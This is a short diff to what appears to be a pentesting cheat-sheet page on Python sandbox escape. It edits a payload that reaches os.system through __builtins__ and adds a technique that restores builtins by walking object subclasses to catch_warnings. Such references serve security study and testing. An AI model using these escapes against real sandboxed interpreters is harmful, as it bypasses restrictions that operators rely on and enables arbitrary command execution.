@@ -59,6 +59,10 @@ system('ls')
 ![](../../.gitbook/assets/image%20%28138%29.png)
 
 * Some more builtin
-  * `__builtins__.__dict__['__import__']("os").system("ls")`
-  * \`\`
+  * `__builtin__.__dict__['__import__']("os").system("ls")`
+
+## No builtin
+
+* Restore builtin using its submodules
+  * `__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__`
 
